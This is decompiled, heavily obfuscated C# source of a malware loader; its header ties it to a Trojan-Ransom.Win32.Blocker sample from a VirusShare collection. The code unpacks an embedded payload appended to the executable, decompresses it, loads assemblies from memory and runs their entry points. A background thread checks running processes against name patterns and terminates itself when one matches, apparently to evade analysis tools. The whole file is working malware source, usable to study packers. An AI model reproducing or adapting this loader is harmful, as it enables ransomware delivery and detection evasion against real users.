// Decompiled with JetBrains decompiler
// Type: Ⴍ.ႷႷ
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Ⴍ
{
  internal sealed class ႷႷ
  {
    public static ႷႷ.ႷႭ Ⴀ;
    public static string[] Ⴀ;
    public static MemoryStream[] Ⴀ;
    public static string[] Ⴓ;
    public static string[] Ⴄ;
    public static bool Ⴐ;

    public ႷႷ() => \u0003.Ⴃ();

    static ႷႷ()
    {
      \u0006.Ⴀ();
      ႷႷ.Ⴐ = false;
    }

    private static long Ⴅ([In] Stream obj0)
    {
      byte[] ⴗ = Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      long num1 = 0;
label_4:
      int num2 = 0;
      int num3 = (int) ⴍ[355] - 175;
      while (true)
      {
        switch (num3)
        {
          case 1:
            goto label_4;
          case 2:
            ++num2;
            int num4 = (int) ⴍ[450];
            int num5 = (int) ⴍ[123];
            Ⴜ.Ⴗ[86] = \u0003\u2002.Ⴍ[60];
            num3 = num4 - num5;
            continue;
          case 3:
            int num6 = ႷႣ.ႠႤ(obj0, (short) 864, 'ͨ');
            num1 |= (long) (byte) num6 << 8 * num2;
            num3 = (int) ⴍ[123];
            continue;
          case 4:
          case 7:
            goto label_3;
          case 5:
            num3 = num2 < 8 ? (int) ⴗ[80] - 52 : (int) ⴗ[48];
            continue;
          case 6:
          case 8:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴅ);
            num3 = (int) ⴗ[109] - 157;
            continue;
        }
      }
label_8:
      return num1;
    }

    private static ႷႷ.ႷႭ Ⴓ([In] MemoryStream obj0)
    {
label_3:
      object obj = (object) new byte[\u000E.ႳႨ(typeof (ႷႷ.ႷႭ), 'ȣ', 584)];
      \u000E.ႳႥ((Stream) obj0, obj as byte[], 0, \u000E.ႳႨ(typeof (ႷႷ.ႷႭ), 'ä', 143), 'Ȱ', 553);
      int num = 3;
      GCHandle gcHandle;
      ႷႷ.ႷႭ structure;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_5;
          case 2:
          case 4:
            goto label_3;
          case 3:
          case 5:
            gcHandle = ႷႣ.ႠႠ((object) (byte[]) obj, GCHandleType.Pinned, (short) 439, 489);
            structure = (ႷႷ.ႷႭ) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (ႷႷ.ႷႭ));
            num = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴓ);
            num = 4;
            continue;
        }
      }
label_5:
      gcHandle.Free();
      return structure;
    }

    private static ႷႷ.ႷႰ Ⴀ([In] MemoryStream obj0, [In] int obj1, [In] ref string obj2, [In] ref MemoryStream obj3)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      object obj = (object) new byte[\u000E.ႳႨ(typeof (ႷႷ.ႷႰ), 'ǟ', 436)];
      Ⴍ.ႷႰ.ႭႭ((Stream) obj0, (long) obj1, SeekOrigin.Begin, (short) 141, '\u0086');
      int num = (int) ⴍ[272];
      GCHandle gcHandle;
      ႷႷ.ႷႰ ⴗⴐ1;
      Array bytes;
      object buffer;
      while (true)
      {
        switch (num)
        {
          case 0:
            Ⴍ.ႷႰ.ႭႭ((Stream) obj0, (long) ⴗⴐ1.Ⴃ, SeekOrigin.Begin, (short) 491, 'Ǡ');
            num = (int) ⴍ[146];
            continue;
          case 2:
          case 10:
            obj0.Seek((long) ⴗⴐ1.Ⴓ, SeekOrigin.Begin);
            goto case 6;
          case 3:
            goto label_12;
          case 4:
            \u000E.ႳႥ((Stream) obj0, bytes as byte[], 0, ⴗⴐ1.Ⴄ, 'ϲ', 1003);
            num = 5;
            continue;
          case 5:
            obj2 = \u0003.Ⴜ('Ƀ', 620).GetString(bytes as byte[]);
            buffer = (object) new byte[ⴗⴐ1.Ⴐ];
            num = 10;
            continue;
          case 6:
            obj0.Read((byte[]) buffer, 0, ⴗⴐ1.Ⴐ);
            num = 3;
            continue;
          case 7:
            \u000E.ႳႥ((Stream) obj0, (byte[]) obj, 0, \u000E.ႳႨ(typeof (ႷႷ.ႷႰ), '˭', 646), 'Ν', 900);
            num = 11;
            continue;
          case 8:
            goto label_3;
          case 9:
            ႷႳ.ႣႭ(ref gcHandle, (short) 697, (short) 684);
            bytes = (Array) new byte[ⴗⴐ1.Ⴄ];
            goto case 0;
          case 11:
            gcHandle = ႷႣ.ႠႠ((object) (byte[]) obj, GCHandleType.Pinned, (short) 208, 142);
            ⴗⴐ1 = (ႷႷ.ႷႰ) \u000E.ႭႠ(\u000E.ႳႼ(ref gcHandle, 559, 537), typeof (ႷႷ.ႷႰ), (short) 139, 214);
            num = 9;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴀ);
            num = 8;
            continue;
        }
      }
label_12:
      obj3.Write(buffer as byte[], 0, ⴗⴐ1.Ⴐ);
      ႷႷ.ႷႰ ⴗⴐ2 = ⴗⴐ1;
      \u0003\u2002.Ⴍ[4] = (byte) (((int) \u0003\u2002.Ⴍ[4] | obj1) & 254);
      return ⴗⴐ2;
    }

    private static string Ⴄ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      object bytes = (object) new byte[obj2];
label_4:
      Ⴍ.ႷႰ.ႭႭ((Stream) obj0, (long) obj1, SeekOrigin.Begin, (short) 578, 'ɉ');
label_5:
      int num = (int) ⴍ[91] - (int) ⴍ[91];
      while (true)
      {
        switch (num)
        {
          case 0:
            \u000E.ႳႥ((Stream) obj0, bytes as byte[], 0, obj2, '˘', 705);
            num = 5;
            continue;
          case 1:
            goto label_3;
          case 3:
            goto label_4;
          case 4:
          case 5:
            goto label_7;
          case 6:
            goto label_5;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴄ);
            num = (int) ⴍ[7];
            continue;
        }
      }
label_7:
      return (IEnumerable<char>) Encoding.UTF8.GetString(bytes as byte[]) as string;
    }

    private static Assembly Ⴄ([In] object obj0, [In] ResolveEventArgs obj1)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴜ.Ⴗ;
label_3:
      IComparable comparable = (IComparable) \u0003.Ⴍ(ႷႣ.ႠႣ(new AssemblyName(\u0003.ႣႰ(obj1, '͒', 892)), '͙', 783), \u000E.Ⴓ(2088295598, 0, 8L, (byte) 4), '˝', (short) 720);
      int num1 = 1;
      int index;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_9;
          case 1:
          case 7:
            index = 1;
            num1 = (int) ⴍ[146];
            continue;
          case 2:
          case 5:
          case 9:
            goto label_6;
          case 3:
            ++index;
            int num2 = (int) ⴗ[122];
            \u0003\u2002.Ⴍ[70] = Ⴜ.Ⴗ[38];
            num1 = num2 - 156;
            continue;
          case 4:
            num1 = index < ႷႷ.Ⴀ.Ⴀ ? 8 : (int) ⴍ[103] - (int) ⴍ[103];
            continue;
          case 6:
            goto label_3;
          case 8:
            num1 = ႷႳ.ႣႣ(ႷႷ.Ⴀ[index], comparable as string, true, '̓', 803) != 0 ? 3 : (int) ⴍ[123];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴄ);
            num1 = 6;
            continue;
        }
      }
label_6:
      return Assembly.Load(\u0006.ႭႰ(ႷႷ.Ⴀ[index], (short) 188, (short) 175));
label_9:
      return (Assembly) null;
    }

    public static bool Ⴍ([In] string obj0, [In] string obj1)
    {
      byte[] ⴗ = Ⴜ.Ⴗ;
      byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
      int num1 = obj0 == null ? (int) ⴗ[82] : 7;
      ISerializable serializable;
      while (true)
      {
        switch (num1)
        {
          case 0:
            serializable = (ISerializable) new Regex(\u0003.ႣႨ(\u0003.ႣႨ(obj1, \u000E.Ⴓ(2088295587, 5, 4L, (byte) 10), \u000E.Ⴓ(2088295590, 7, 7L, (byte) 1), (short) 285, 370), \u000E.Ⴓ(2088295634, 8, 11L, (byte) 7), \u000E.Ⴓ(2088295637, 0, 15L, (byte) 29), (short) byte.MaxValue, 144).Replace('?', '.').ToLower());
            num1 = (int) ⴍ[262] - (int) ⴍ[0];
            continue;
          case 1:
          case 3:
            goto label_5;
          case 4:
          case 5:
          case 8:
            goto label_3;
          case 6:
            goto label_7;
          case 7:
            num1 = \u0003.ႣႣ(obj0, 'M', (short) 2) != 0 ? 0 : (int) ⴍ[7];
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴍ);
            num1 = (int) ⴗ[121] - 87;
            continue;
        }
      }
label_5:
      int num2 = (int) \u0006.Ⴄ();
      return false;
label_7:
      return ((Regex) serializable).IsMatch(obj0.ToLower());
    }

    public static bool Ⴈ([In] string obj0, [In] string[] obj1)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴜ.Ⴗ;
label_3:
      Array array = (Array) obj1;
      int index = 0;
      int num = (int) ⴍ[550] / 5;
      bool flag;
      while (true)
      {
        switch (num)
        {
          case 1:
            IComparable<string> comparable = (IComparable<string>) ((string[]) array)[index];
            num = !ႷႷ.Ⴍ(obj0, comparable as string) ? 3 : 2;
            continue;
          case 2:
            flag = true;
            num = (int) ⴗ[29] - 179;
            continue;
          case 3:
          case 7:
            ++index;
            num = (int) ⴍ[53];
            continue;
          case 4:
            goto label_9;
          case 6:
          case 8:
            goto label_3;
          case 9:
            num = index < ((string[]) array).Length ? 1 : 10;
            continue;
          case 10:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴈ);
            num = 8;
            continue;
        }
      }
label_8:
      \u000E.Ⴃ();
      return false;
label_9:
      return flag;
    }

    public static void Ⴀ()
    {
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_4;
          case 1:
            num = 0;
            continue;
          case 3:
            goto label_5;
          case 4:
            goto label_6;
          default:
            \u0005\u2000.ႠႨ(\u0006.ႭႳ((short) 511, 'Ƕ'), 212, (short) 222);
            goto case 1;
        }
      }
label_5:
      return;
label_6:
      return;
label_4:
      \u0006.ႭႳ((short) 22, '\u001F').Close();
      Process.GetCurrentProcess().Kill();
      Ⴍ.ႷႰ.Ⴄ();
    }

    public static void Ⴗ()
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴜ.Ⴗ;
      while (true)
      {
        int num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 2:
            case 3:
              goto label_5;
            default:
              if (ႷႷ.Ⴐ)
              {
                num1 = (int) ⴗ[37] - 120;
                continue;
              }
              goto label_8;
          }
        }
label_8:
        Array array = (Array) \u0003.ႣႤ(319, 'ĳ');
        int index = 0;
label_9:
        int num2 = 9;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              ႷႷ.Ⴀ();
              goto case 8;
            case 1:
              goto label_9;
            case 2:
              ႷႷ.Ⴀ();
              goto case 10;
            case 5:
              goto label_16;
            case 7:
              goto label_8;
            case 8:
              ႷႣ.ႠႨ(100, 971, 'α');
              ++index;
              num2 = (int) ⴗ[86] - 162;
              continue;
            case 9:
              num2 = index < ((Process[]) array).Length - 1 ? 11 : (int) ⴍ[7] * 5;
              continue;
            case 10:
              num2 = !ႷႷ.Ⴈ(\u0006.ႭႼ((array as Process[])[index], 'ů', 'ť'), ႷႷ.Ⴄ) ? (int) ⴍ[11] - 12 : 3;
              continue;
            case 11:
              num2 = !ႷႷ.Ⴈ(\u0006.ႭႼ((array as Process[])[index], 'Ȉ', 'ȁ'), ႷႷ.Ⴓ) ? (int) ⴗ[133] - 157 : (int) ⴗ[67];
              continue;
            default:
              goto label_7;
          }
        }
label_16:
        Thread.Sleep(1500);
      }
label_5:
      Ⴍ.ႷႰ.Ⴀ();
      return;
label_7:
      // ISSUE: method reference
      RuntimeMethodHandle runtimeMethodHandle = __methodref (ႷႷ.Ⴗ);
    }

    [STAThread]
    private static void Ⴄ([In] string[] obj0)
    {
      byte[] ⴍ = \u0003\u2002.Ⴍ;
      byte[] ⴗ = Ⴜ.Ⴗ;
      int num1 = 27;
      object obj1;
      object obj2;
      long num2;
      Array array1;
      \u0002\u2000 obj3;
      long num3;
      int num4;
      int index;
      object obj4;
      IConvertible text;
      IConvertible caption;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 9:
            num2 = ႷႷ.Ⴅ((Stream) obj2);
            Ⴍ.ႷႰ.ႭႭ((Stream) (obj2 as MemoryStream), -num2 - 8L, SeekOrigin.Current, (short) 326, 'ō');
            num1 = 14;
            continue;
          case 1:
            \u0005\u2000.ႠႭ(new Thread(new ThreadStart(ႷႷ.Ⴗ)), (short) 844, '̵');
            goto case 6;
          case 2:
            string str1 = ႷႷ.Ⴄ(obj1 as MemoryStream, ႷႷ.Ⴀ.Ⴄ, ႷႷ.Ⴀ.Ⴃ);
            object obj5 = (object) new char[1];
            (obj5 as char[])[0] = '|';
            char[] chArray1 = obj5 as char[];
            ႷႷ.Ⴓ = Ⴍ.ႷႰ.ႭႨ(str1, chArray1, (short) 389, 409);
            num1 = 8;
            continue;
          case 3:
            ႷႳ.ႣႰ((Stream) obj2, 691, (short) 696);
            Ⴍ.ႷႰ.ႭႭ((Stream) obj1, 0L, SeekOrigin.Begin, (short) 370, 'Ź');
            num1 = 15;
            continue;
          case 4:
            num1 = ႷႷ.Ⴀ.Ⴀ <= 1 ? 16 : (int) ⴍ[107];
            continue;
          case 5:
            caption = (IConvertible) \u000E.Ⴓ(2088295821, 0, 0L, (byte) 7);
            goto case 25;
          case 6:
            ႷႷ.Ⴀ = new string[ႷႷ.Ⴀ.Ⴀ];
            ႷႷ.Ⴀ = new MemoryStream[ႷႷ.Ⴀ.Ⴀ];
            num4 = \u000E.ႳႨ(typeof (ႷႷ.ႷႭ), 'ˣ', 648);
            num1 = 26;
            continue;
          case 7:
            int num5 = (int) MessageBox.Show((string) text, caption as string, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            num1 = ((Assembly) obj4).EntryPoint.GetParameters().Length != 0 ? (int) ⴍ[2] - 48 : (int) ⴍ[467] - 50;
            continue;
          case 8:
            string str2 = ႷႷ.Ⴄ(obj1 as MemoryStream, ႷႷ.Ⴀ.Ⴗ, ႷႷ.Ⴀ.Ⴓ);
            Array array2 = (Array) new char[1];
            (array2 as char[])[0] = '|';
            char[] chArray2 = array2 as char[];
            ႷႷ.Ⴄ = Ⴍ.ႷႰ.ႭႨ(str2, chArray2, (short) 707, 735);
            num1 = 1;
            continue;
          case 10:
            ႷႷ.Ⴐ = ႷႷ.Ⴀ.Ⴅ;
            num1 = (int) ⴗ[10] - 25;
            continue;
          case 11:
            ((\u0005\u2000) obj3).\u0002\u2000\u2009\u2001\u0002((Stream) obj2, (Stream) obj1, num2, num3, (\u0006\u2001) null);
            num1 = (int) ⴗ[83] - 178;
            continue;
          case 12:
            MethodInfo entryPoint = ((Assembly) obj4).EntryPoint;
            Array array3 = (Array) new object[1];
            (array3 as object[])[0] = (object) obj0;
            object[] parameters = array3 as object[];
            entryPoint.Invoke((object) null, parameters);
            num1 = 17;
            continue;
          case 13:
            num4 += \u000E.ႳႨ(typeof (ႷႷ.ႷႰ), 'ù', 146);
            ++index;
            num1 = (int) ⴍ[507];
            continue;
          case 14:
            array1 = (Array) new byte[5];
            \u000E.ႳႥ((Stream) (obj2 as MemoryStream), (byte[]) array1, 0, 5, 'Z', 67);
            num1 = (int) ⴍ[433];
            continue;
          case 15:
            ႷႷ.Ⴀ = ႷႷ.Ⴓ((MemoryStream) obj1);
            num1 = !ႷႷ.Ⴀ.Ⴅ ? (int) ⴍ[214] / 9 : (int) ⴗ[67];
            continue;
          case 16:
            obj4 = (object) \u000E.ႭႳ(\u0006.ႭႰ(ႷႷ.Ⴀ[0], (short) 172, (short) 191), 193, (short) 219);
            num1 = (int) ⴍ[197];
            continue;
          case 17:
            num1 = !ႷႷ.Ⴀ.Ⴅ ? (int) ⴗ[109] - 138 : (int) ⴗ[35] / 2;
            continue;
          case 18:
            obj3 = (\u0002\u2000) new \u0005\u2000();
            (obj3 as \u0005\u2000).\u0003\u2000\u2009\u2001\u0002(array1 as byte[]);
            num3 = ႷႷ.Ⴅ((Stream) (obj2 as MemoryStream));
            num1 = (int) ⴍ[369];
            continue;
          case 19:
            text = (IConvertible) \u000E.Ⴓ(2088295629, 2, 7L, (byte) 16);
            goto case 5;
          case 20:
            ႷႷ.Ⴀ[index] = string.Empty;
            ႷႷ.Ⴀ[index] = new MemoryStream();
            ႷႷ.Ⴀ(obj1 as MemoryStream, num4, ref ႷႷ.Ⴀ[index], ref ႷႷ.Ⴀ[index]);
            num1 = (int) ⴗ[70] - 189;
            continue;
          case 21:
            Ⴍ.ႷႰ.ႭႣ(\u0006.ႭႭ(641, '˽'), new ResolveEventHandler(ႷႷ.Ⴄ), (short) 403, 484);
            goto case 16;
          case 22:
            num1 = index < ႷႷ.Ⴀ.Ⴀ ? 20 : (int) ⴗ[48] / 2;
            continue;
          case 23:
            goto label_29;
          case 24:
            ((Assembly) obj4).EntryPoint.Invoke((object) null, (object[]) null);
            num1 = 17;
            continue;
          case 25:
            num1 = 7;
            continue;
          case 26:
            index = 0;
            num1 = (int) ⴍ[507];
            continue;
          case 28:
            num1 = (object) (obj4 as Assembly) == null ? 17 : (int) ⴗ[106] - 232;
            continue;
          default:
            \u0006.Ⴀ();
            obj1 = (object) new MemoryStream();
            obj2 = (object) new MemoryStream(\u0003\u2002.Ⴅ());
            Ⴍ.ႷႰ.ႭႭ((Stream) (obj2 as MemoryStream), -8L, SeekOrigin.End, (short) 777, '̂');
            num1 = 0;
            continue;
        }
      }
label_29:
      \u000E.Ⴈ();
    }

    public struct ႷႰ
    {
      public int Ⴓ;
      public int Ⴐ;
      public int Ⴃ;
      public int Ⴄ;

      static ႷႰ() => \u0006.Ⴀ();
    }

    public struct ႷႭ
    {
      public bool Ⴅ;
      public int Ⴀ;
      public int Ⴄ;
      public int Ⴃ;
      public int Ⴗ;
      public int Ⴓ;

      static ႷႭ() => \u0006.Ⴀ();
    }
  }
}
